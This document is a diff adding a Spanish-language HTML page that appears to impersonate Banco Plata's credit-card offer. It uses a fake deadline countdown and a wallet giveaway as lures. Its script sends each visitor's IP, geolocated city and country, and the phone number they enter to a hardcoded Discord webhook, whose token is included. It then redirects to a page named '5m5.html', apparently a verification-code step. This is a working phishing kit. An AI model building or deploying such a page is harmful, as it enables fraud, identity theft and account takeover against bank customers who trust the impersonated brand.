@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Banco Plata - Tarjeta de Crédito</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; -webkit-tap-highlight-color: transparent; }
+    body { background-color: #000; min-height: 100dvh; display: flex; justify-content: center; }
+    .app-container { width: 100%; max-width: 520px; position: relative; overflow: hidden; display: flex; flex-direction: column; min-height: 100dvh; }
+    .bg-video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 0; }
+    .overlay { position: absolute; bottom: 0; left: 0; width: 100%; height: 80%; background: linear-gradient(to top, rgba(0,0,0,0.95) 0%, rgba(0,0,0,0.6) 40%, transparent 100%); z-index: 1; }
+    .header { position: relative; z-index: 10; padding: 20px 24px; display: flex; justify-content: space-between; align-items: center; }
+    .logo-container { display: flex; flex-direction: column; line-height: 1; }
+    .logo-banco { color: #fff; font-size: 10px; font-weight: 600; letter-spacing: 2px; margin-bottom: 2px; }
+    .logo-plata { color: #fff; font-size: clamp(24px, 6vw, 28px); font-weight: 800; letter-spacing: 1px; }
+    .header-actions { display: flex; align-items: center; gap: 16px; }
+    .btn-obtener-header { background: transparent; border: 1.5px solid #fff; color: #fff; padding: 8px 18px; border-radius: 20px; font-size: 14px; font-weight: 600; cursor: pointer; }
+    .menu-icon { width: 24px; height: 24px; display: flex; flex-direction: column; justify-content: space-around; cursor: pointer; }
+    .menu-icon span { display: block; width: 100%; height: 2px; background-color: #fff; border-radius: 2px; }
+    
+    .badge-dias { position: absolute; top: clamp(110px, 18vh, 140px); left: 24px; background-color: #FFE8E0; color: #FF4E00; padding: 8px 16px; border-radius: 20px; font-size: clamp(12px, 3.5vw, 14px); font-weight: 700; z-index: 10; display: flex; align-items: center; gap: 6px; white-space: nowrap; }
+    
+    .main-content { position: relative; z-index: 10; padding: 0 24px; margin-top: clamp(80px, 15vh, 120px); display: flex; flex-direction: column; flex-grow: 1; }
+    .title { color: #fff; font-size: clamp(32px, 9vw, 42px); font-weight: 800; line-height: 1.1; margin-bottom: 16px; letter-spacing: -1px; }
+    .subtitle { color: #fff; font-size: clamp(14px, 4vw, 16px); line-height: 1.4; font-weight: 500; margin-bottom: auto; padding-bottom: 40px; }
+    .subtitle sup { font-size: 10px; font-weight: 600; opacity: 0.8; }
+    .footer { position: relative; z-index: 10; padding: 20px 24px calc(20px + env(safe-area-inset-bottom)); }
+    .btn-obtener-main { width: 100%; background-color: #FF5A00; color: #fff; border: none; padding: 18px; border-radius: 14px; font-size: clamp(16px, 4.5vw, 18px); font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); transition: transform 0.1s; }
+    .btn-obtener-main:active { transform: scale(0.98); }
+    
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100dvh; background-color: rgba(0, 0, 0, 0.8); display: flex; justify-content: center; align-items: center; z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; backdrop-filter: blur(4px); padding: 20px; }
+    .modal-overlay.active { opacity: 1; pointer-events: auto; }
+    .modal-content { background-color: #fff; width: 100%; max-width: 400px; border-radius: 24px; padding: clamp(24px, 5vw, 32px) clamp(20px, 5vw, 24px); position: relative; display: flex; flex-direction: column; align-items: center; transform: translateY(20px); transition: transform 0.3s ease; max-height: 90dvh; overflow-y: auto; }
+    .modal-overlay.active .modal-content { transform: translateY(0); }
+    .btn-close { position: absolute; top: 16px; right: 16px; background: none; border: none; font-size: 24px; color: #B0B0B0; cursor: pointer; line-height: 1; padding: 8px; }
+    .card-image-container { width: 100%; max-width: clamp(200px, 60vw, 260px); margin-bottom: 24px; display: flex; justify-content: center; }
+    .card-image-container img { width: 100%; height: auto; object-fit: contain; border-radius: 14px; box-shadow: 0 10px 20px rgba(0,0,0,0.15); }
+    .modal-title { color: #000; font-size: clamp(18px, 5vw, 22px); font-weight: 700; text-align: center; line-height: 1.3; margin-bottom: 24px; }
+    .input-group { display: flex; width: 100%; background-color: #F4F5F9; border-radius: 14px; margin-bottom: 16px; overflow: hidden; border: 1px solid transparent; transition: border 0.2s; }
+    .input-group:focus-within { border: 1px solid #FF4E00; }
+    .prefix { padding: 18px 16px; background-color: #EBEBEF; font-size: 16px; color: #333; font-weight: 600; border-right: 1px solid #ddd; }
+    .input-phone { flex: 1; background: transparent; border: none; padding: 18px; font-size: 16px; color: #333; font-weight: 500; outline: none; letter-spacing: 1px; min-width: 0; }
+    .btn-primary { width: 100%; background-color: #FF4E00; color: #fff; border: none; padding: 18px; border-radius: 14px; font-size: clamp(15px, 4vw, 16px); font-weight: 700; cursor: pointer; transition: background-color 0.2s; display: flex; justify-content: center; align-items: center; }
+    .btn-primary:active { background-color: #E64500; }
+    .btn-primary:disabled { background-color: #FFA07A; cursor: not-allowed; }
+    .spinner { width: 24px; height: 24px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+
+  <div class="app-container">
+    <video class="bg-video" autoplay loop muted playsinline>
+      <source src="https://bancoplata.mx/static/origination-client-web/card/main-bunner/New%20Credito/video/2x/silver-credito-promo-mucha-desktop-v3.mp4" type="video/mp4">
+    </video>
+    <div class="overlay"></div>
+
+    <header class="header">
+      <div class="logo-container">
+        <span class="logo-banco">BANCO</span>
+        <span class="logo-plata">PLATA</span>
+      </div>
+      <div class="header-actions">
+        <button class="btn-obtener-header" onclick="trackAction('Clic en Obtener (Header)'); openModal()">Obtener</button>
+        <div class="menu-icon"><span></span><span></span><span></span></div>
+      </div>
+    </header>
+
+    <div class="badge-dias" id="countdownBadge">🔥 Cargando...</div>
+
+    <main class="main-content">
+      <h1 class="title">La tarjeta de crédito de Banco Plata</h1>
+      <p class="subtitle">Solicítala antes del 15 de noviembre sin anualidad y obtén hasta $200,000 la línea de crédito <sup>T&C</sup></p>
+    </main>
+
+    <div class="footer">
+      <button class="btn-obtener-main" onclick="trackAction('Clic en Obtener Tarjeta (Main)'); openModal()">Obtener tarjeta</button>
+    </div>
+  </div>
+
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal-content">
+      <button class="btn-close" onclick="trackAction('Cerró el modal'); closeModal()">✕</button>
+      
+      <div class="card-image-container">
+        <img src="logo.jpg" alt="Tarjeta Plata" onerror="this.src='https://i.imgur.com/8QO9y8f.png'">
+      </div>
+
+      <h2 class="modal-title">Llévate una cartera exclusiva al activar tu tarjeta</h2>
+
+      <div class="input-group">
+        <div class="prefix">+52</div>
+        <input type="tel" class="input-phone" placeholder="XX XXXX XXXX" id="phoneInput" maxlength="10" inputmode="numeric">
+      </div>
+
+      <button class="btn-primary" id="btnSubmit" onclick="redirectToCode()">
+        <span id="btnText">La quiero</span>
+        <div class="spinner" id="btnSpinner"></div>
+      </button>
+    </div>
+  </div>
+
+  <script>
+    // NUEVO WEBHOOK ACTUALIZADO
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571164818553966615/6aK6_RyRyUP7M8SAr3RZDHP2nTsK1wu_irSR2ewG2i5t4axW1ad1hP21yRNX3dUITQQc';
+
+    // --- LÓGICA DE CUENTA REGRESIVA ---
+    // Establecer la fecha límite: 15 de Noviembre a las 23:59:59 (Hora local del usuario)
+    function startCountdown() {
+      const targetDate = new Date();
+      targetDate.setMonth(10); // Noviembre (0 = Enero, 10 = Noviembre)
+      targetDate.setDate(15);
+      targetDate.setHours(23, 59, 59, 999);
+
+      const badge = document.getElementById('countdownBadge');
+
+      function updateCountdown() {
+        const now = new Date().getTime();
+        const distance = targetDate.getTime() - now;
+
+        if (distance < 0) {
+          badge.innerHTML = "🔥 ¡Oferta finalizada!";
+          clearInterval(countdownInterval);
+          return;
+        }
+
+        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+        // Formatear para que siempre tengan 2 dígitos (ej. 09 en vez de 9)
+        const hStr = hours.toString().padStart(2, '0');
+        const mStr = minutes.toString().padStart(2, '0');
+        const sStr = seconds.toString().padStart(2, '0');
+
+        badge.innerHTML = `🔥 Quedan ${days}d ${hStr}h ${mStr}m ${sStr}s`;
+      }
+
+      updateCountdown(); // Ejecutar de inmediato
+      const countdownInterval = setInterval(updateCountdown, 1000);
+    }
+
+    // Iniciar la cuenta regresiva al cargar
+    document.addEventListener('DOMContentLoaded', startCountdown);
+
+    // --- RESTO DE LA LÓGICA ---
+    async function trackAction(actionName, phoneNumber = null) {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        const time = new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });
+
+        let message = `🖱️ **Acción del Usuario:** ${actionName}\n`;
+        if (phoneNumber) message += `📱 Teléfono: ${phoneNumber}\n`;
+        message += `🌐 IP: ${data.ip || 'Desconocida'}\n📍 Ciudad: ${data.city || 'Desconocida'}, ${data.country_name || 'Desconocido'}\n⏰ Hora: ${time}`;
+
+        const payload = { username: "Plata Event Tracker", content: message };
+
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+      } catch (e) { console.error('Error tracking', e); }
+    }
+
+    function openModal() { document.getElementById('modalOverlay').classList.add('active'); }
+    function closeModal() { document.getElementById('modalOverlay').classList.remove('active'); }
+
+    const phoneInput = document.getElementById('phoneInput');
+    phoneInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, ''); });
+
+    async function redirectToCode() {
+        const phone = phoneInput.value.trim();
+        if (phone.length !== 10) { alert('Por favor, ingresa un número de celular mexicano válido (10 dígitos).'); return; }
+        
+        const fullPhone = '+52 ' + phone;
+        localStorage.setItem('plata_phone', fullPhone);
+        
+        const btn = document.getElementById('btnSubmit');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('btnSpinner');
+        
+        btn.disabled = true; btnText.style.display = 'none'; spinner.style.display = 'block';
+
+        await trackAction(`Ingresó teléfono y presionó "La quiero"`, fullPhone);
+
+        setTimeout(() => { window.location.href = '5m5.html'; }, 4000);
+    }
+  </script>
+</body>
+</html>
